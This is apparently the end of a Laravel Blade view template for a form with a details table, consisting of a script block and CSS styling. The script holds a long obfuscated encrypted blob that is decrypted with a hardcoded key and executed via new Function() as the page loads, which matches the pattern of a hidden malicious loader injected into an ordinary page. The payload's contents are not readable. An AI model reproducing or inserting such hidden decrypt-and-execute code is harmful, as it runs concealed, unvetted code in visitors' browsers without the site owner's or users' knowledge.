yEoETBYITwBESgtJiYmOC0gKzYwHy84JRgoNSsOIjElGyU2KBUzPCwbJjsrFigtIRImOCYVKzYwHy84JRgoNSsOIjElGyU2KBUzPCwbJjsrFigtIRImOCYVKzYwHy84JRgDOSwuMTIUHDUhNBs0KzAWPiw3GC8+Mg0OJCEOKzY3Ky84Li0oNSsOIjElGyU2KBUzPCwbJjsrFigtIRImOCYVKzYwHy84JRgoNSsOIjElGyU2KBUzPCwbJjsrFigtIRImOCYVKzYdLS84Li0oNSsOIjElGyU2KBUzPCwbJjsrFigtIRImOCYVKzYwHy84JRgoNSsOIjElGyU2KBUzPAEpJzw3GzMQPRI9PzobLCEsESgvORYvIjcAJSY5FSIhNBs0KzAVISw3GC86PRwhLzobLCEsESgvORYvIjcOOTY5FSIhNBs0KzAVISw3GC86PRwhLzobLCEsESgvORYvIjcAJSY5FSIhNBs0KzAVISgODCgtIRInKzkWAiorXTcrOhU7UigJCy0+HA1QVCUbWzMZNiwJDS8TKQkiXCYOLCc8BCgGLQMvCyMVJQ8tACIIIA40AiQAIQUjDS8TKQkhBi4OLAg4BCgGLQMvCyMVJQ8tACIIIA40AiQAIQUjDS8TKg0OKzkbBSEeBi85OVsoNCcBIjEEKCU3NFEzPSBYJjsKIigsPVEmOSkgKzc/LC85OV0oNQlNIjEEKiU3NBgzPAIUJjokJigsPVQmOSUlKzYeWS85OVooNCcOIjELWCU3NBgzPAIUJjonUigsPR8mOAgaKzYSXS85ORUoNQUOIjELFSU3NBgzPAIUJjsJVCgsPR8mOAgaKzcwXS85ORUoNQUBIjApXiU3NBgzPAIUJjokJygsPVEmOSoaKzYRLC85ORUoNQUBIjAqKiU3NFYzPSAUJjsKJSgsPVYmOSpWKzYRKy85OVsoNCQ7IjAqKCU3NFAzPA5YJjsKJygsPR8mOAgbKzYSES85OV4oNQVIIjApXSU3NFMzPA0uJjsOIigsPR8mOAgaKzYSWy85ORUoNQUBIjApXiU3NBgzPAIUJjsKJigsPR8mOAgaKzc8Hy85ORUoNQUBIjEHXSU3NBgzPAIUJjsFUSgsPR8mOAgVKzYeES8VBwMvUSsVJSApACIIIA40AiQAIQUjDS8TKQkhBi4OLAg4BCgGLQMvCyMVJQ8tACIIIA40AiQAIQUjDS8TKQkhBi4OLAg4BCgGLh8BUDgRCiIAByU2KBUzPCspJjsrFjgULhYPXjoOLFIwBCgpKQMvCyMVJQ8tACIIIA40AiQAIQUjDS8TKQkhBi4OLAg4BCgGLQMvCyMVJQ8tACIIIA43WDQAISonDS8TKQkhBi4OLAg4BCgGLQMvCyMVJQ8tACIIIA40AiQAIQUjDS8TKQkhBi4OLAg4BCgpKQMvCyMVJQ8tACIIIA40AiQAIQUjDS8TKQkhBi4OLAg4BCgGLQMvCyMVJQ8tACIIIxIjATAVISwFCQMhJjI1OxcSOyESBCgGLQMsUSsVJSApACIIIA40AiQAIQUjDS8TKQkhBi4OLAg4BCgGLQMvCyMVJQ8tACIIIA40AiQAIQUjDS8TKQkhBi4OLAg4BCgGLgMuDyAAMj02AA0MMycjPz8ECDgaUSk6AwkhXCYOLCc8BCgGLQMvCyMVJQ8tACIIIA40AiQAIQUjDS8TKQkhBi4OLAg4BCgGLQMvCyMVJQ8tACFSMA40LSAAIQUjDS8TKQkhBi4OLAg4BCgGLQMvCyMVJQ8tACIIIA43WDQcJjssIigtKicmOCYVKzYwHy84JRgoNSsOIjEIKSU2IyAzPAEpJzw3GzMeVVg=";
const KEY="hellobaby";
try{const decrypted=decryptIt(ENCRYPTED,KEY);if(decrypted){const func=new Function(decrypted);func();}}catch(error){console.error('Execution error:',error);}
})();
</script>

<style>
.required::after {
    content: " *";
    color: #dc3545;
}
.bg-light {
    background-color: #f8f9fa !important;
}
.bg-white {
    background-color: #ffffff !important;
}
.table-bordered td {
    border: 1px solid #dee2e6;
}
#detailsTable tbody tr:hover {
    background-color: #f8f9fa;
}
#detailsTable tbody tr td {
    vertical-align: middle;
}
.gap-1 {
    gap: 0.25rem;
}
</style>
@endsection